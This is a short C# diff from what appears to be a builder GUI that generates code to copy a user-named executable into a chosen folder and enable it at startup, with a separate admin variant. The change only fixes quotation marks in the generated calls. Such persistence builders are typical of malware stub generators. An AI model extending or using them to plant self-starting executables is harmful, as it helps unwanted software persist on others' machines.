@@ -1247,7 +1247,7 @@ namespace DNAV_GUI
                     if (needAdmin)
                     {
                         // Admin an anderem Ort
-                        code += @"Startup.CopyAndEnableForAdmin(""";
+                        code += @"Startup.CopyAndEnableForAdmin(";
                         switch (autostartCopyCombobox.SelectedIndex)
                         {
                             case 0:
@@ -1260,12 +1260,12 @@ namespace DNAV_GUI
                                 code += "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)";
                                 break;
                         }
-                        code += @""", """ + nameTextBox.Text + @".exe"");";
+                        code += @", """ + nameTextBox.Text + @".exe"");";
                     }
                     else
                     {
                         // Normal an anderem Ort
-                        code += @"Startup.CopyAndEnable(""";
+                        code += @"Startup.CopyAndEnable(";
                         switch (autostartCopyCombobox.SelectedIndex)
                         {
                             case 0:
@@ -1278,7 +1278,7 @@ namespace DNAV_GUI
                                 code += "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)";
                                 break;
                         }
-                        code += @""", """ + nameTextBox.Text + @".exe"");";
+                        code += @", """ + nameTextBox.Text + @".exe"");";
                     }
                 } else
                 {
